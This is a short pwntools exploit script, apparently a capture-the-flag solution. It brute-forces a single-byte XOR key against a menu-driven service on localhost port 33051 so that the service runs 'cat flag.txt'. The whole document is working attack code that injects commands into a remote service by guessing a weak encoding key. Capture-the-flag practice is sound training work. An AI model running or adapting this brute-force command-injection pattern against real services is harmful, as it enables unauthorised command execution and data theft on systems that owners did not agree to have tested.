from pwn import *

def log(message):
    print repr(message)

def send_enc_command(io, key):
    command = "cat flag.txt"
    command = ''.join([chr(ord(i) ^ key) for i in command])
    io.sendline('1')
    io.send(command)

def execute(io):
    io.sendline('2')
    io.recvuntil('>')
    io.sendline('1')


def exploit(io, key):
    io.recvuntil('>')
    send_enc_command(io, key)
    io.recvuntil('>')
    execute(io)
    return io.recvall()

if __name__ == '__main__':
    for key in range(256):
        io = remote("localhost", 33051)
        ans = exploit(io, key)
        io.close()
        if 'flag' in ans:
            print ans
            print hex(key)
            break
        io.close()